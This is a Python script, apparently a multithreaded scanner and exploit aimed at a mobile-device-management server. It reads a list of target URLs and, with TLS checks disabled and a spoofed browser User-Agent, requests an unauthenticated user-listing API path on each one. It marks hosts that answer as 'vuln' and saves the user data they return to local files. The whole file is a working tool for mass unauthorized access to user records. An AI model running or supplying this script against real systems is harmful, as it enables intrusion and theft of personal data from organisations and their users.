import argparse
import requests
import threading
from colorama import Fore, Style


def check_index_html_existence(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }


    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url


    index_url = url.rstrip('/') + "/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1"

    try:

        response = requests.get(index_url, headers=headers, verify=False, timeout=3)


        if response.status_code == 200:
            print(f"{Fore.GREEN}url {index_url} vuln{Style.RESET_ALL}")

 
            content = response.text

 
            filename = url.replace("://", "_").replace("/", "_") + ".html"
            with open(filename, "w", encoding="utf-8") as file:
                file.write(content)
                print(f"{Fore.GREEN} {index_url} saved as  {filename}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED} {index_url} not vuln{Style.RESET_ALL}")
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}timeout {index_url} refused access{Style.RESET_ALL}")
    except requests.exceptions.RequestException:
        print(f"{Fore.RED}wrong url {index_url} refused access{Style.RESET_ALL}")


def main():

    parser = argparse.ArgumentParser(description="check url  ")
    parser.add_argument("-f", "--file", help="check target file list")
    parser.add_argument("-u", "--url", help="check single url")
    args = parser.parse_args()


    urls = []
    if args.url:
        urls.append(args.url)
    elif args.file:
        with open(args.file, "r") as file:
            urls = [line.strip() for line in file if line.strip()]


    threads = []


    for url in urls:
        thread = threading.Thread(target=check_index_html_existence, args=(url,))
        thread.start()
        threads.append(thread)


    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()

